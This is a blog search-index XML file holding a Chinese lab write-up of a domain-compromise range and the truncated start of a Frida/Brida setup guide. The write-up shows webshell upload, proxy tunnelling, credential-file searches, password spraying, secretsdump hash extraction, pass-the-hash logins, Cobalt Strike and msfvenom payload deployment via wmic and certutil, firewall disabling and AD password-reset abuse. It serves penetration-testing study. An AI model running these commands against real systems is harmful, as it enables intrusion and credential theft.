<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>靶机-No-CVE-Range系列靶场B</title>
    <link href="/2025/12/10/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/"/>
    <url>/2025/12/10/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/</url>
    
    <content type="html"><![CDATA[<p>靶场环境来自：棉花糖——靶机-No-CVE-Range系列靶场B</p><p>大概拓扑如下：</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210162221648.png" alt="image-20251210162221648"></p><h2 id="1、端口扫描与服务探测"><a href="#1、端口扫描与服务探测" class="headerlink" title="1、端口扫描与服务探测"></a>1、端口扫描与服务探测</h2><p>通达OA任意文件上传，传了一个马，用蚁剑连接</p><p>发现有个192.168.10.0&#x2F;24段的，搭个代理访问</p><p>先搭建个隧道，本来想用Stowawa的，没成功</p><p>用了一个http协议的工具suo5（后面把suo5代理换成了reGeorg，可以看”在搭建代理链过程中遇到问题”）</p><p>因为网站是php语言写的，所以把.php文件上传到根目录作为服务端</p><p>客户端如下</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114112954992.png" alt="image-20251114112954992"></p><p>配置proxifier</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114113438321.png" alt="image-20251114113438321"></p><p>192.168.111.20主机里面有有一个密码本</p><p>cmd：<code>dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*</code></p><p>powershell：<code>Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue -Include *pass*.txt, *pass*.xml, *pass*.ini, *cred*, *vnc*, *.config, *user* -File | Select-Object FullName, Length, LastWriteTime</code></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114141151805.png" alt="image-20251114141151805"></p><p>192.168.10.128  alice&#x2F;P@ssw0rd</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114141212869.png" alt="image-20251114141212869"></p><p>将fscan传到第一台主机上，进行内网网段扫描，存在一台主机192.168.10.128</p><p>进行端口扫描，fscan -h 192.168.10.128 -p 1-65535 -o fscan.txt</p><h2 id="2、3389远程登录"><a href="#2、3389远程登录" class="headerlink" title="2、3389远程登录"></a>2、3389远程登录</h2><p>注意，要加域前缀（例如 <code>domain\username</code>）</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114155102391.png" alt="image-20251114155102391"></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114155507520.png" alt="image-20251114155507520"></p><p>信息收集，还有一个域环境，网段172.16.10.0&#x2F;24</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119130804720.png" alt="image-20251119130804720"></p><h2 id="3、域内信息收集"><a href="#3、域内信息收集" class="headerlink" title="3、域内信息收集"></a>3、域内信息收集</h2><p>这里记下工具BloodHound，可视化图形显示域环境中的关系</p><p>工具安装使用参考文章：<a href="https://www.freebuf.com/articles/web/288370.html">https://www.freebuf.com/articles/web/288370.html</a></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210150901895.png" alt="image-20251210150901895"></p><h2 id="5、内网穿透搭建"><a href="#5、内网穿透搭建" class="headerlink" title="5、内网穿透搭建"></a>5、内网穿透搭建</h2><p>搭建个代理链，物理机访问172.16段</p><p>192.168.111.20执行：</p><p><code>ew_for_Win.exe -s rcsocks -l 1080 -e 7778</code></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164232384.png" alt="image-20251118164232384"></p><p>192.168.10.128执行：</p><p><code>ew_for_Win.exe -s rssocks -d 192.168.10.98 -e 7778</code></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164307170.png" alt="image-20251118164307170"></p><p>Pro设置</p><p>这里的6665就是上面搭的1111</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118170350212.png" alt="image-20251118170350212"></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118170433336.png" alt="image-20251118170433336"></p><p>测试是否搭建成功</p><p>.\nxc.exe smb 172.16.10.129 -u alice -p P@ssw0rd</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119160517587.png" alt="image-20251119160517587"></p><p>没啥问题，可以通过物理机访问到172.16段</p><h2 id="6、共享目录枚举与敏感信息获取"><a href="#6、共享目录枚举与敏感信息获取" class="headerlink" title="6、共享目录枚举与敏感信息获取"></a>6、共享目录枚举与敏感信息获取</h2><p>本来想在物理机上枚举172网段SMB共享目录，运行命令 以后，web服务就挂，需要重启靶场才行，只能在内网主机上执行了</p><p><code>.\nxc.exe smb 172.16.10.0/24 -u alice -p P@ssw0rd --shares</code></p><ul><li><strong>发现172.16.10.129自定义共享 xya，有读权限</strong></li></ul><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119163719297.png" alt="image-20251119163719297"></p><p>爬取所有文件</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119164708451.png" alt="image-20251119164708451"></p><p>获取文件</p><p>cmd：<code>net use Z: \\172.16.10.129\xya /user:xya.com\alice P@ssw0rd &amp;&amp; type Z:\Memo.txt &amp;&amp; net use Z: /delete</code></p><p>arlpass<br>anonymous<br>root<br>12345678<br>private<br>123<br>zxsoft1234!@#$<br>123456<br>admin<br>system<br>hicomadmin<br>eyou_admin<br>cyouadmin<br>#NAME?<br>leadsec.auditor<br>12345<br>cnoa.cn2010password<br>leadsec@7766<br>admin123<br>leadsec<br>leadsec32<br>leadsec.useradmin<br>leadsec.waf<br>admin*PWD<br>firewall<br>Xyacontribution1!<br>hillstone<br>guest<br>qxcomm1680<br>qxcommsupport<br>qxcomm1688<br>qxcommsuport<br>sua_password$123<br>sa_password$123<br>password$123<br>venus70<br>venus60<br>sys$admin@028<br>freesvr<br>csmp@CLOUD987</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119165547883.png" alt="image-20251119165547883"></p><h2 id="7、域用户枚举与密码喷洒"><a href="#7、域用户枚举与密码喷洒" class="headerlink" title="7、域用户枚举与密码喷洒"></a>7、域用户枚举与密码喷洒</h2><p>nxc.exe smb 172.16.10.129 -u user.txt -p pass.txt</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210160741099.png" alt="image-20251210160741099"></p><h2 id="8、PowerShell历史文件，获取高权限用户凭据"><a href="#8、PowerShell历史文件，获取高权限用户凭据" class="headerlink" title="8、PowerShell历史文件，获取高权限用户凭据"></a>8、PowerShell历史文件，获取高权限用户凭据</h2><p>你会有疑问，这怎么用CS执行了？因为这个靶场不是我连续做完的，每次做的时候方法不一样，截图就不连贯，可以看下面的”上线到CS”</p><p>powerpick Get-ChildItem -Path “C:\Users*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&quot; -Recurse -Filter “<em>history</em>“ -ErrorAction SilentlyContinue | ForEach-Object { “&#96;n&#x3D;&#x3D;&#x3D; $($<em>.FullName) &#x3D;&#x3D;&#x3D;”; Get-Content $</em>.FullName -ErrorAction SilentlyContinue } | Out-File C:\Windows\Temp\all_history.txt</p><p>download C:\Windows\Temp\all_history.txt</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128172051341.png" alt="image-20251128172051341"></p><p>calue&#x2F;LongliveChina1!</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128172130727.png" alt="image-20251128172130727"></p><h2 id="9、使用secretsdump-py工具导出域管理员用户哈希"><a href="#9、使用secretsdump-py工具导出域管理员用户哈希" class="headerlink" title="9、使用secretsdump.py工具导出域管理员用户哈希"></a>9、使用secretsdump.py工具导出域管理员用户哈希</h2><p><a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a></p><p>D:\tools\secretsdump_windows.exe xya&#x2F;calue:‘LongliveChina1!‘@172.16.10.130 -dc-ip 172.16.10.130 -just-dc-user administrator</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251209171211399.png" alt="image-20251209171211399"></p><p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:ece39e1190e04b11c0c21797feb2ec1e:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:c64e5ebc5f7b7ac425200b12eac0dfb70e36377052547242b185683eac422dcf<br>Administrator:aes128-cts-hmac-sha1-96:e126327fd843bfc06141b711523f003f<br>Administrator:des-cbc-md5:ead0b585e9fd3e5d</p><h2 id="10、利用域管理员哈希，通过evil-winrm工具实现哈希传递登录域控制器（172-16-10-130）"><a href="#10、利用域管理员哈希，通过evil-winrm工具实现哈希传递登录域控制器（172-16-10-130）" class="headerlink" title="10、利用域管理员哈希，通过evil-winrm工具实现哈希传递登录域控制器（172.16.10.130）"></a>10、利用域管理员哈希，通过evil-winrm工具实现哈希传递登录域控制器（172.16.10.130）</h2><p><a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p><p>ruby evil-winrm.rb -u administrator -H ece39e1190e04b11c0c21797feb2ec1e -i 172.16.10.130</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251210142332649.png" alt="image-20251210142332649"></p><h2 id="上线到CS"><a href="#上线到CS" class="headerlink" title="上线到CS"></a>上线到CS</h2><p>把第一台主机上线到CS</p><p>木马上传到蚁剑运行就行</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128112658485.png" alt="image-20251128112658485"></p><h3 id="第二台主机上线CS"><a href="#第二台主机上线CS" class="headerlink" title="第二台主机上线CS"></a>第二台主机上线CS</h3><p>参考文章：<a href="https://www.lmboke.com/archives/nei-wang-shen-tou-dai-li-socksxie-yi-lu-you-bu-chu-wang-hou-shen-tou-tong-xun-cs">https://www.lmboke.com/archives/nei-wang-shen-tou-dai-li-socksxie-yi-lu-you-bu-chu-wang-hou-shen-tou-tong-xun-cs</a></p><p>思路：在192.168.10.128执行正向连接的木马程序，然后让192.168.10.98去主动连接192.168.10.128</p><p>cs添加监听器</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095755182.png" alt="image-20251128095755182"></p><p>生成exe程序</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095847898.png" alt="image-20251128095847898"></p><p>上传到192.168.10.128的系统执行exe程序。来到10.98的会话中执行如下命令</p><p>命令：connect ip port。connect 192.168.10.128 4433</p><p>成功上线</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128095939020.png" alt="image-20251128095939020"></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128100016924.png" alt="image-20251128100016924"></p><h3 id="第三台主机上线CS"><a href="#第三台主机上线CS" class="headerlink" title="第三台主机上线CS"></a>第三台主机上线CS</h3><p>假设已经通过密码喷洒得到了凭证vllay&#x2F;Xyacontribution1!</p><p>把木马上传到192.168.10.128，在10.128会话执行</p><ul><li>在本地创建共享目录</li></ul><p>shell mkdir C:\share</p><ul><li>复制木马到共享目录</li></ul><p>shell copy C:\Users\Public\beacon4.exe C:\share\   (C:\Users\alice\Desktop)</p><p>shell copy C:\Users\alice\Desktop\beacon4.exe C:\share\ </p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128153305118.png" alt="image-20251128153305118"></p><ul><li>使用域账户 <code>XYA\vllay</code> 和密码创建访问令牌</li></ul><p>make_token XYA\vllay Xyacontribution1!</p><p><code>make_token</code> 是cs的内置命令，用于：在当前会话中模拟指定用户身份、避免在每条命令中重复输入凭证、对后续所有操作生效</p><p>找到密码本：</p><p>shell dir \172.16.10.129\c$</p><p>shell type \172.16.10.129\c$\xya_share\Memo.txt</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128153413932.png" alt="image-20251128153413932"></p><ul><li>将木马程序复制到目标机器的临时目录</li></ul><p>shell copy C:\share\beacon4.exe \172.16.10.129\c$\Windows\Temp\beacon4.exe</p><ul><li>使用WMI远程执行木马程序</li></ul><p>shell wmic &#x2F;node:172.16.10.129 &#x2F;user:XYA\vllay &#x2F;password:Xyacontribution1! process call create “C:\Windows\Temp\beacon4.exe”</p><p>命令：connect ip port。connect 172.16.10.129 4434</p><p>成功上线</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128162052488.png" alt="image-20251128162052488"></p><h2 id="上线到MSF"><a href="#上线到MSF" class="headerlink" title="上线到MSF"></a>上线到MSF</h2><p>都是主动连接</p><p>需要获取一个正向的msf连接，生成一个正向tcp连接的payload文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">.\msfvenom -p windows/x64/meterpreter/bind_tcp lport=5555 -f exe -o b.exe<br></code></pre></td></tr></table></figure><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128111355108.png" alt="image-20251128111355108"></p><p>将木马上传</p><p>exe执行成功之后，192.168.111.20会开启5555端口监听，然后在msf上个运行blin_tcp模块来获取shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">use exploit/multi/handler<br>set payload windows/x64/meterpreter/bind_tcp<br>set rhost 192.168.111.20<br>set lport 5555<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128111421705.png" alt="image-20251128111421705"></p><p>上线第二个主机，添加路由</p><p>(&#x2F;img&#x2F;靶机-No-CVE-Range系列靶场B&#x2F;image-20251128111504293.png)<br>将木马上传</p><p>exe执行成功之后，192.168.10.128会开启5555端口监听，然后在msf上个运行blin_tcp模块来获取shell</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251128112127151.png" alt="image-20251128112127151"></p><p>10.129的上线参照CS和msf就可以，一样的。</p><h2 id="文件上传到192-168-10-128主机方法："><a href="#文件上传到192-168-10-128主机方法：" class="headerlink" title="文件上传到192.168.10.128主机方法："></a>文件上传到192.168.10.128主机方法：</h2><p>方法一：直接通过3389复制粘贴</p><p>方法二：10.128可以访问到10.98，把文件上传到图片目录上去</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251114163848281.png" alt="image-20251114163848281"></p><p>然后10.128请求路径，即可下载</p><p><code>certutil -urlcache -split -f http://192.168.10.98/images/ew_for_Win.exe</code></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118093151508.png" alt="image-20251118093151508"></p><h2 id="在搭建代理链过程中遇到问题"><a href="#在搭建代理链过程中遇到问题" class="headerlink" title="在搭建代理链过程中遇到问题"></a>在搭建代理链过程中遇到问题</h2><p>问题一：在192.168.10.98这个主机上执行-s rcsocks -l 1080 -e 7778命令时，3389就断，最后把suo5代理换成了reGeorg，就解决了</p><p>换reGeorg也和suo5操作差不多</p><p>netstat -ano |findstr  端口</p><p>taskkill &#x2F;t &#x2F;f &#x2F;pid  111</p><p><code>python3 neoreg.py -k password -u http://192.168.111.20/tunnel.php -p 6665</code></p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118164840020.png" alt="image-20251118164840020"></p><p>问题二：在搭建过程中，192.168.10.128主机上的ew一直连接不到10.98主机，ping可以ping通</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118165115015.png" alt="image-20251118165115015"></p><p>​<code>netsh advfirewall set allprofiles state off</code>，关闭10.98主机Windows 防火墙，问题解决</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251118165153220.png" alt="image-20251118165153220"></p><h2 id="4、权限滥用修改用户密码"><a href="#4、权限滥用修改用户密码" class="headerlink" title="4、权限滥用修改用户密码"></a>4、权限滥用修改用户密码</h2><h4 id="查看对特定用户的委派权限"><a href="#查看对特定用户的委派权限" class="headerlink" title="查看对特定用户的委派权限"></a>查看对特定用户的委派权限</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 需要安装 ActiveDirectory 模块</span><br><span class="hljs-built_in">Import-Module</span> ActiveDirectory<br><br><span class="hljs-comment"># 查看对 wake 用户的有效权限</span><br>(<span class="hljs-built_in">Get-Acl</span> <span class="hljs-string">&quot;AD:\<span class="hljs-variable">$</span>(Get-ADUser wake -Properties DistinguishedName | Select-Object -ExpandProperty DistinguishedName)&quot;</span>).Access | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.IdentityReference <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*alice*&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119111117851.png" alt="image-20251119111117851"></p><h4 id="权限详情解析"><a href="#权限详情解析" class="headerlink" title="权限详情解析"></a>权限详情解析</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ActiveDirectoryRights</span> : ExtendedRight          ← 扩展权限<br><span class="hljs-attribute">ObjectType</span>            : <span class="hljs-number">00299570</span>-<span class="hljs-number">246</span>d-<span class="hljs-number">11</span>d0-a768-<span class="hljs-number">00</span>aa006e0529  ← 重置密码 GUID<br><span class="hljs-attribute">AccessControlType</span>     : <span class="hljs-literal">Allow</span>                  ← 允许<br><span class="hljs-attribute">IdentityReference</span>     : XYA\alice              ← 授权给 alice<br></code></pre></td></tr></table></figure><p><strong><code>00299570-246d-11d0-a768-00aa006e0529</code></strong> 是 Active Directory 中 <strong>“User-Force-Change-Password”（重置密码）</strong> 的标准 GUID。</p><h3 id="现在可以重置密码了"><a href="#现在可以重置密码了" class="headerlink" title="现在可以重置密码了"></a>现在可以重置密码了</h3><p>使用 PowerShell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 重置 wake 的密码</span><br><span class="hljs-variable">$newPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;NewP@ssw0rd2025!&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> wake <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-NewPassword</span> <span class="hljs-variable">$newPassword</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119112218362.png" alt="image-20251119112218362"></p><p>切换到 wake 域用户的方法</p><p>runas &#x2F;user:XYA\wake powershell</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119111713111.png" alt="image-20251119111713111"></p><p>搜索flag文件</p><p>powershell：Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue -Include <em>pass</em>.txt, <em>pass</em>.xml, <em>pass</em>.ini, <em>cred</em>, <em>vnc</em>, *.config, <em>user</em> -File | Select-Object FullName, Length, LastWriteTime</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251119113018338.png" alt="image-20251119113018338"></p><h2 id="以Wake域用户身份上线CS"><a href="#以Wake域用户身份上线CS" class="headerlink" title="以Wake域用户身份上线CS"></a>以Wake域用户身份上线CS</h2><h4 id="以-Wake-域用户权限运行-Alice-桌面的文件"><a href="#以-Wake-域用户权限运行-Alice-桌面的文件" class="headerlink" title="以 Wake 域用户权限运行 Alice 桌面的文件"></a>以 Wake 域用户权限运行 Alice 桌面的文件</h4><p>复制文件到公共位置，这样wake才有权访问</p><p>runas &#x2F;user:XYA\wake  “C:\Users\Public\beacon2.exe”</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251120113151295.png" alt="image-20251120113151295"></p><p>以wake身份上线</p><p><img src="/img/%E9%9D%B6%E6%9C%BA-No-CVE-Range%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BAB/image-20251120113311294.png" alt="image-20251120113311294"></p><p>我是边学边做的，有不对的地方请谅解，请指正，感谢。</p>]]></content>
    
    
    <categories>
      
      <category>靶场练习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域环境</tag>
      
      <tag>WP</tag>
      
      <tag>代理链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win上配置brida插件</title>
    <link href="/2025/08/29/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/"/>
    <url>/2025/08/29/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="站在巨人Frida肩膀上的Brida"><a href="#站在巨人Frida肩膀上的Brida" class="headerlink" title="站在巨人Frida肩膀上的Brida"></a>站在巨人Frida肩膀上的Brida</h1><p>文章内容来自于大佬的分享-<a href="https://www.bilibili.com/video/BV1pf421q7yF/?spm_id_from=333.1387.homepage.video_card.click&vd_source=f5d34760803af8ba5abc7870283628e2">App渗透:BurpSuite插件-Brida apk逆向自动加解密Custom plugins演示_哔哩哔哩_bilibili</a></p><p>跟着佬复现的一枚小学生，记录下来给自己看的</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h5 id="安装brida插件"><a href="#安装brida插件" class="headerlink" title="安装brida插件"></a>安装brida插件</h5><p><code>https://github.com/federicodotta/Brida</code></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430100127694.png" alt="image-20250430100127694"></p><h5 id="pip版本"><a href="#pip版本" class="headerlink" title="pip版本"></a>pip版本</h5><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250501094916467.png" alt="image-20250501094916467"></p><h5 id="github下载scrcpy工具"><a href="#github下载scrcpy工具" class="headerlink" title="github下载scrcpy工具"></a>github下载scrcpy工具</h5><p>（顺便给手机打开USB调试）</p><p><code>https://github.com/Genymobile/scrcpy</code></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430094525809.png" alt="image-20250430094525809"></p><h5 id="安装pyro4库"><a href="#安装pyro4库" class="headerlink" title="安装pyro4库"></a>安装pyro4库</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">python11 -m pip <span class="hljs-keyword">install</span> pyro4<br></code></pre></td></tr></table></figure><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430140118668.png" alt="image-20250430140118668"></p><p>adb安装后添加到环境变量</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430095146336.png" alt="image-20250430095146336"></p><h5 id="安装frida-compile"><a href="#安装frida-compile" class="headerlink" title="安装frida_compile"></a>安装frida_compile</h5><p><code>npm install frida-compile</code>(我忘了我怎么安装的了研究了好一会都没想起来，好像是安装frida的时候自动安装的)</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430095940791.png" alt="image-20250430095940791"></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250507091411649.png" alt="image-20250507091411649"></p><p>将路径复制到插件中，版本大于10不需要勾选</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430100242137.png" alt="image-20250430100242137"></p><h5 id="安装frida"><a href="#安装frida" class="headerlink" title="安装frida"></a>安装frida</h5><p>pip安装模块：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> frida<br>pip <span class="hljs-keyword">install</span> frida-tools<br></code></pre></td></tr></table></figure><p>安装好后，在系统 <code>cmd</code> 执行 <code>frida --version</code> 命令，如果有版本信息就是安装成功了</p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250313155352510.png" alt="image-20250313155352510"></p><h5 id="安装frida-server"><a href="#安装frida-server" class="headerlink" title="安装frida-server"></a>安装frida-server</h5><p>server的版本和frida的一样，我用的是16.6.6，<code>https://github.com/frida/frida/releases</code></p><p>查看手机系统版本，系统为arm，server也选择arm</p><p><code>getprop ro.product.cpu.abi</code></p><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250430100750011.png" alt="image-20250430100750011"></p><p>把文件下载下来解压，然后使用<code>adb push</code>命令将文件上传到安卓 <code>/data/local/tmp</code> 目录下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> push C:\Users\灵越<span class="hljs-number">5510</span>\Desktop\frida-server-<span class="hljs-number">16</span>.<span class="hljs-number">6</span>.<span class="hljs-number">6</span>-android-arm64\frida-server-<span class="hljs-number">16</span>.<span class="hljs-number">6</span>.<span class="hljs-number">6</span>-android-arm64 /data/local/tmp<br></code></pre></td></tr></table></figure><p><img src="/img/win%E4%B8%8A%E9%85%8D%E7%BD%AEbrida%E6%8F%92%E4%BB%B6/image-20250313164044415.png" alt="image-20250313164044415"></p><p>然后进入安卓的 <code>/data/local/tmp</code> 目录给 <code>frida-server</code> 文件加上 <code>777</code> 权限</p><p><img 